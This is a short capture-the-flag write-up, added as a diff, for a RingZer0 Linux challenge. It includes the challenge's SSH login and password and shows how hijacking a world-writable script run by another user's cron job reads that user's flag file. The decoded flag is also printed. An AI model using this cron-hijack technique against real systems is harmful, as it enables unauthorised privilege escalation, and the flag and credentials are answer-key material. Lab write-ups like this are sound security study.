@@ -1,0 +1,46 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/147
+# Objective: Get access to the cypher account.
+
+cypher
+
+ssh morpheus@challenges.ringzer0team.com -p 10147
+pass: VNZDDLq2x9qXCzVdABbR1HOtz
+
+1. ssh into server
+
+2. look in backup for cypher
+```
+Mar 12 22:01:58 forensics crontab[1662]: (cypher) BEGIN EDIT (cypher)
+Mar 12 22:02:27 forensics crontab[1662]: (cypher) REPLACE (cypher)
+Mar 12 22:02:27 forensics crontab[1662]: (cypher) END EDIT (cypher)
+Mar 12 22:03:01 forensics /USR/SBIN/CRON[1682]: (cypher) CMD (python /tmp/Gathering.py)
+```
+
+3. cat /tmp/Gathering.py
+```
+import os
+os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
+```
+
+4. ls -l /tmp/Gathering.py (file is editable by me)
+```
+-rwxrwxrwx 1 cypher cypher 66 Oct 10 16:24 /tmp/Gathering.py
+```
+
+5. vi /tmp/Gathering.py
+```
+import os
+os.system('cat /home/cypher/flag.txt > /tmp/28JNvE05KBltE8S7o2xu')
+```
+
+6. cat /tmp/28JNvE05KBltE8S7o2xu
+```
+BASE ?
+RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==
+```
+
+7. echo "RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==" | base64 -d
+```
+FLAG-0cfc3390a082a22fdd763f4426f43296
+```
